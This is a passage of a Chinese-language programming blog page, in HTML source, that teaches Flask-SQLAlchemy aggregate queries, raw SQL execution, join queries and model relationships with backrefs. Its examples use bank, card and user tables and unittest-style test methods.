<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_bank_money</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 防止出现异常：no application found</span></span><br><span class="line">    app.app_context().push()</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># db.session.query() 查询结果是list[(id,name)]</span></span><br><span class="line">    <span class="comment"># result = db.session.query(User.id, User.name).all()</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># collections.namedtuple()</span></span><br><span class="line">    <span class="comment"># print(type(result[0])) # &lt;class &#x27;sqlalchemy.engine.row.Row&#x27;&gt;</span></span><br><span class="line">    <span class="comment"># for id, name in result:</span></span><br><span class="line">    <span class="comment">#     # 以模型对象的方式来显示数据</span></span><br><span class="line">    <span class="comment">#     print(id, name)</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># for item in result:</span></span><br><span class="line">    <span class="comment">#     # 以模型对象的方式来显示数据</span></span><br><span class="line">    <span class="comment">#     print(item.id, item.name)</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># db.session.query() 查询结果是list[&lt;User 1&gt;, ...]</span></span><br><span class="line">    <span class="comment"># result = db.session.query(User).all()</span></span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 汇总每个银行的开户的人数、总金额和每个银行的最小金额和最大金额银行卡绑定的用户信息</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 返回结果：list[&lt;sqlalchemy.util._collections.result&gt;] -&gt; collections.namedtuple()</span></span><br><span class="line">    results = db.session.query(Card.bank_id,</span><br><span class="line">                               db.func.<span class="built_in">min</span>(Card.money).label(<span class="string">&#x27;min_&#x27;</span>),</span><br><span class="line">                               db.func.<span class="built_in">max</span>(Card.money).label(<span class="string">&#x27;max_&#x27;</span>),</span><br><span class="line">                               db.func.count(<span class="string">&#x27;*&#x27;</span>).label(<span class="string">&#x27;cnt&#x27;</span>),</span><br><span class="line">                               db.func.<span class="built_in">sum</span>(Card.money).label(<span class="string">&#x27;total&#x27;</span>)</span><br><span class="line">                          	   ).group_by(Card.bank_id).<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> results:</span><br><span class="line">        <span class="built_in">print</span>(Bank.query.get(item.bank_id).name, item.cnt, item.total, item.min_, item.max_)</span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 最小金额的用户信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;--------------------最小和最大的存款用户信息---------------------&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> user_id, money <span class="keyword">in</span> db.session.query(Card.user_id, Card.money).<span class="built_in">filter</span>(</span><br><span class="line">            Card.bank_id == item.bank_id, db.or_(</span><br><span class="line">                Card.money == item.min_, Card.money == item.max_)).<span class="built_in">all</span>():</span><br><span class="line">            <span class="built_in">print</span>(User.query.get(user_id).name, money)</span><br></pre></td></tr></table></figure>

<h3 id="原生SQL查询"><a href="#原生SQL查询" class="headerlink" title="原生SQL查询"></a>原生SQL查询</h3></li>
</ul>
<p>sqlalchemy库支持原生SQL查询，db.session.execute(sql)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_card_user_bank</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        <span class="comment"># 查询用户名、手机号、银行名、银行地址、银行卡及存款</span></span><br><span class="line">        sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            select u.name, u.phone, b.name, b.address, c.number, c.money</span></span><br><span class="line"><span class="string">            from user u</span></span><br><span class="line"><span class="string">            JOIN card c on (u.id = c.user_id)</span></span><br><span class="line"><span class="string">            JOIN bank b on (b.id = c.bank_id)</span></span><br><span class="line"><span class="string">            order by c.money desc</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        exc = db.session.execute(sql)</span><br><span class="line">        <span class="keyword">for</span> username, phone, bankname, address, number, money <span class="keyword">in</span> exc.cursor:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(username, phone, bankname, address, number, money)</span><br></pre></td></tr></table></figure>

<p>exc.cursor是pymysql.cursor.Cursor类型，而且cursor可以被迭代。</p>
<p>思考：如何让cursor查询结果是dict对象，而不是现在的元组。</p>
<h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><ul>
<li><p>join() 内连接</p>
</li>
<li><p>outerjoin() 外连接</p>
<p>普通的db.session.query()+filter()也可以实现多个实体类进行连接查询</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_user_card</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line">    result = db.session.query(User.name, User.phone, Card.money,</span><br><span class="line">                              Bank.name.label(<span class="string">&#x27;bankname&#x27;</span>),</span><br><span class="line">                              Bank.address, Card.money, Card.number</span><br><span class="line">                              ).<span class="built_in">filter</span>(</span><br><span class="line">                              User.<span class="built_in">id</span> == Card.user_id).<span class="built_in">filter</span>(Bank.<span class="built_in">id</span> == Card.bank_id)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result.<span class="built_in">all</span>():</span><br><span class="line">        <span class="built_in">print</span>(item.name, item.phone, item.bankname, item.address, item.number.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>), item.money)</span><br></pre></td></tr></table></figure>

<h3 id="总结db-Column-对象的常用方法"><a href="#总结db-Column-对象的常用方法" class="headerlink" title="总结db.Column()对象的常用方法"></a>总结db.Column()对象的常用方法</h3><ul>
<li>label()列的别名</li>
<li>desc() / asc()排序</li>
<li>条件方法<ul>
<li>startswith()    endswith()    like()    contains()    _<em>le()</em>_    _<em>ge()</em>_    lt()    gt()    eq()    isnot()    in_()    notin_()</li>
</ul>
</li>
</ul>
<p>flask.pocoo.org/docs/  官方文档。</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlalchemy.org/">https://www.sqlalchemy.org/</a> 官方文档。</p>
</li>
</ul>
<h2 id="二、SQLAlchemy的模型关系与反向引用"><a href="#二、SQLAlchemy的模型关系与反向引用" class="headerlink" title="二、SQLAlchemy的模型关系与反向引用"></a>二、SQLAlchemy的模型关系与反向引用</h2><p>模型关系分四种：</p>
<ul>
<li>一对一关系</li>
<li>一对多关系</li>
<li>多对一关系</li>
<li>多对多关系</li>
</ul>
<p>配置用户、银行和银行卡的关联关系：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Card</span>(db.Model):</span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    number = db.Column(db.String(<span class="number">20</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    money = db.Column(db.Float(<span class="number">2</span>), default=<span class="number">0</span>, server_default=<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模型的关系维护（建立）在多端</span></span><br><span class="line">    user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>))</span><br><span class="line">    user = db.relationship(User, backref=<span class="string">&#x27;cards&#x27;</span>) <span class="comment"># backref反向链接</span></span><br><span class="line"></span><br><span class="line">    bank_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;bank.id&#x27;</span>))</span><br><span class="line">    bank = db.relationship(Bank, backref=<span class="string">&#x27;cards&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>两个模型类之间建立关系，必须存在一个外键约束。</p>
<p>单元测试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestRelationship</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_1</span>(<span class="params">self</span>):</span><br><span class="line">        app.app_context().push()</span><br><span class="line">        user = User.query.get(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(user.name)</span><br><span class="line">        <span class="keyword">for</span> card <span class="keyword">in</span> user.cards:</span><br><span class="line">            <span class="built_in">print</span>(card.bank.name, card.number, card.money)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>(<span class="params">self</span>):</span><br><span class="line">    app.app_context().push()</span><br><span class="line">    <span class="keyword">for</span> card <span class="keyword">in</span> Card.query.<span class="built_in">all</span>():</span><br><span class="line">        <span class="comment"># 显示用户名、用户的手机号、银行名，存款</span></span><br><span class="line">        <span class="built_in">print</span>(card.user.name, card.user.phone, card.bank.name, card.money)</span><br></pre></td></tr></table></figure>

<p>关于relationship的用法（自关联）：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9477a28f5079">https://www.jianshu.com/p/9477a28f5079</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Private</p>
  <div class="site-description" itemprop="description">程序语言记录</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Private</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
